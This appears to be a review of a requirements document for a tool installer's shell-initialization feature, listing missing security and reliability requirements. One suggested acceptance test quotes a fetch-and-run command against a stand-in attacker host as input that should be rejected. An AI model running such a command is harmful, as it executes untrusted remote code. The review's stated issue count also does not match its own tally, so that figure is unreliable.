# Completeness Review

## Verdict: FAIL

## Issues Found

### Critical (blocks implementation without guessing)

**C1. No requirement for `source_file` variant.** R2 says "generate or copy per-tool shell initialization scripts" but the requirements never specify the `source_file` path -- only `source_command` is implied. The design doc describes both `source_command` and `source_file` params with different security profiles, but the PRD has no requirement distinguishing them. An implementer wouldn't know whether to build one or both, or what validation rules apply to `source_file` (path traversal prevention, symlink resolution). Add a requirement covering the static-file variant and its security constraints.

**C2. No requirement for shell.d cache rebuild.** The delivery mechanism (R3) says scripts "must be automatically sourced" via shellenv, but there's no requirement for the cache file, its atomic rebuild, or when rebuilds are triggered. The design doc's `RebuildShellCache` is a core component with specific trigger conditions (install, remove, update). Without a PRD requirement, an implementer could reasonably implement direct glob-sourcing instead of caching, violating the 5ms performance goal.

**C3. No requirement for content hashing or tamper detection.** The design doc specifies SHA-256 content hashes stored in VersionState and verified during cache rebuild. This is a security-critical mechanism (prevents TOCTOU attacks, detects compromised tool output) with no corresponding PRD requirement. R12 mentions "declarative trust model" but doesn't cover integrity verification of generated content.

**C4. `install_completions` action has no requirements.** The design doc describes `install_completions` as a Phase 4 deliverable, and the Out of Scope section references "completion generation from tools that don't support it" (implying tools that do support it are in scope). But there are no functional requirements for completion installation, no acceptance criteria, and no user story. Either add requirements or explicitly defer it to Out of Scope.

**C5. No requirement for error isolation in cache.** The design doc's security section identifies "denial of shell" -- a syntax error in one tool's init breaks all shell sessions because the cache concatenates everything. It recommends wrapping each tool's content in a subshell or error-trapped block. No PRD requirement covers this. This is user-facing reliability, not just a design concern.

### Significant (gap between problem/requirements/AC)

**S1. No requirement for `--no-shell-init` install flag.** The design doc specifies `tsuku install --no-shell-init` for users who want to opt out. No PRD requirement or AC covers this. This is a user control mechanism for a trust-model change.

**S2. No requirement for update-time diff visibility.** The design doc recommends displaying a diff and logging a warning when `source_command` output changes during update. This addresses the highest residual supply-chain risk identified in exploration. No PRD requirement covers it.

**S3. `tsuku doctor` integration has no requirement.** The design doc adds shell.d verification to `tsuku doctor` (cache freshness, hash integrity, symlink detection, syntax checking, listing active scripts). No PRD requirement. This is the primary user-facing diagnostic tool for the new subsystem.

**S4. R10 (multi-version safety) AC is underspecified.** The acceptance criterion says "removing v1 does not delete shell init files that v2 also references" but doesn't define what "references" means. Does v2 need to have identical cleanup paths? What if v2 produces different shell.d content for the same filename? The design doc's cross-referencing logic (compare cleanup paths across versions) should be reflected in the AC.

**S5. No requirement for `shell_integration` metadata visibility.** The design doc recommends a recipe metadata field that `tsuku info` displays so users know which tools influence their shell. No PRD requirement. Users currently have no way to discover which installed tools have shell hooks.

### Minor

**M1. Acceptance criteria don't cover `source_file` variant.** All ACs use niwa (which uses `source_command`). No AC verifies the static-file path. If `source_file` is in scope, it needs its own AC.

**M2. No user story for the "cautious user" persona.** The design doc acknowledges a trust model shift and provides opt-out mechanisms (`--no-shell-init`, `tsuku info` visibility). But there's no user story for a security-conscious developer who wants to inspect what's being sourced before trusting it.

**M3. Out of Scope doesn't mention `tsuku doctor`.** If doctor integration is deferred, say so. If it's in scope (design doc implies it is), add a requirement.

**M4. No requirement for file permissions on shell.d.** The design doc specifies 0700 on the directory and 0600 on files. This is a security hardening measure with no PRD requirement.

**M5. No requirement for file locking during cache rebuild.** The design doc identifies concurrent installation races as a risk and prescribes file locking. No PRD requirement.

**M6. `pre-remove` and `pre-update` phases are declared in the design but "reserved for future use."** The PRD doesn't clarify whether implementing these phase values (even if unused) is in scope or out of scope. An implementer might build the filtering infrastructure for all four phases or just two.

## Requirements-to-AC Coverage Matrix

| Requirement | Has AC? | Notes |
|-------------|---------|-------|
| R1 (post-install phase) | Partial | Covered implicitly by niwa install AC |
| R2 (shell init installation) | Yes | AC 1 |
| R3 (shell init delivery) | Yes | AC 1 |
| R4 (cleanup on removal) | Yes | AC 2 |
| R5 (cleanup state tracking) | Yes | AC 9 (offline removal) |
| R6 (update continuity) | Yes | AC 3 |
| R7 (stale artifact cleanup) | Yes | AC 4 |
| R8 (backward compatibility) | Yes | AC 5 |
| R9 (graceful failure) | Yes | AC 6 |
| R10 (multi-version safety) | Partial | AC 8, but "references" undefined |
| R11 (startup performance) | Yes | AC 7 |
| R12 (declarative trust model) | No | No AC verifies that arbitrary scripts are rejected |
| R13 (recipe simplicity) | Yes | AC 10 |
| Content hashing (design) | No | No requirement or AC |
| Error isolation in cache (design) | No | No requirement or AC |
| install_completions (design) | No | No requirement or AC |
| --no-shell-init flag (design) | No | No requirement or AC |
| Doctor integration (design) | No | No requirement or AC |
| File permissions (design) | No | No requirement or AC |

## Suggested Improvements

1. Add a requirement for the shell.d cache mechanism (atomic rebuild, trigger conditions). This is the core delivery mechanism -- it shouldn't be a design-only detail.

2. Add a requirement for content integrity verification (hashing at write, verification at cache rebuild). This directly supports the trust model goal.

3. Either add requirements and ACs for `install_completions` or move it explicitly to Out of Scope with a note that the phase infrastructure supports it.

4. Add a requirement for error isolation in the cache file (one tool's bad init must not break other tools or the shell session).

5. Add a requirement for `--no-shell-init` opt-out. The trust model shift (R12) implies users should have control, but no requirement delivers that control.

6. Add an AC for R12 that verifies arbitrary shell scripts in recipes are rejected (e.g., a recipe with `source_command = "curl http://evil.com | sh"` fails validation).

7. Add a user story for the security-conscious developer who wants visibility into what tools modify their shell environment.

8. Clarify in Out of Scope whether `pre-remove` and `pre-update` phase values are implemented (parser accepts them) or deferred entirely.

9. Add an AC for the `source_file` variant if it's in scope.

10. Add a requirement for `tsuku doctor` shell.d checks, or explicitly defer it.

## Summary

The PRD covers the core happy path well -- install, remove, update with shell integration via shellenv. The main gap is between the design doc and the PRD: the design doc identified several security hardening measures (content hashing, file permissions, error isolation, tamper detection, opt-out flags, doctor integration) that have no corresponding PRD requirements. An implementer following only the PRD would build a functional system that's missing its security and reliability guardrails. The `install_completions` action exists in a limbo between in-scope and out-of-scope. 12 issues found: 5 critical, 5 significant, 6 minor (some minor items are grouped).
